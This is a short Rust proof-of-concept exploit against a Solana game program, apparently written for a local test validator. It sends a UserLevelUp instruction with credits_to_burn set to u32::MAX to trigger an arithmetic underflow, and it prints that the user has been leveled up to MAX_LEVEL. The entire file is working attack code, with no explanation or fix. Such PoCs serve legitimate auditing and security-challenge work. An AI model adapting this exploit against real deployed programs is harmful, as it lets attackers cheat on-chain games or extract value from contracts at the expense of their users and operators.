use solana_client::rpc_client::RpcClient;
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
enum ProgramInstruction {
    UserLevelUp { credits_to_burn: u32 },
}

fn exploit(
    program_id: Pubkey,
    game_config: Pubkey,
    user_account: Pubkey,
    user_authority: Keypair,
) -> Result<(), Box<dyn std::error::Error>> {
    let client = RpcClient::new("http://localhost:8899".to_string());

    let instruction = Instruction::new_with_borsh(
        program_id,
        &ProgramInstruction::UserLevelUp { credits_to_burn: u32::MAX },
        vec![
            AccountMeta::new_readonly(game_config, false),
            AccountMeta::new(user_account, false),
            AccountMeta::new_readonly(user_authority.pubkey(), true),
        ],
    );

    let recent_blockhash = client.get_latest_blockhash()?;
    let tx = Transaction::new_signed_with_payer(
        &[instruction],
        Some(&user_authority.pubkey()),
        &[&user_authority],
        recent_blockhash,
    );

    client.send_and_confirm_transaction(&tx)?;
    println!("Exploit: Underflow triggered, leveled up to MAX_LEVEL");
    Ok(())
}